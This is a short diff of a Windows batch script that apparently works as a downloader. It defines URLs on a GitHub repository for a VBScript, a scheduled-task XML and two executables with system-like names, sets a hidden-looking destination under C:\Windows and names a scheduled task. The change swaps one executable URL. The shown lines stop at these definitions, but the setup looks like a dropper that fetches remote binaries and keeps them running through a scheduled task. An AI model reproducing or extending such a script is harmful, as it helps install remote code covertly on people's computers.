@@ -4,7 +4,7 @@ REM Define URLs and destination directory
 set "URL1=https://raw.githubusercontent.com/m-c00/td/main/win-win.xml"
 set "URL2=https://raw.githubusercontent.com/m-c00/td/main/wscript.vbs"
 set "URL3=https://raw.githubusercontent.com/m-c00/td/main/win-tr4.exe"
-set "URL4=https://raw.githubusercontent.com/m-c00/td/main/win-db.exe"
+set "URL4=https://raw.githubusercontent.com/m-c00/td/main/win-db4.exe"
 set "DEST_DIR=C:\Windows\programs\preflog"
 set "TASK_XML=%DEST_DIR%\win-win.xml"
 set "TASK_NAME=WinWinTask"
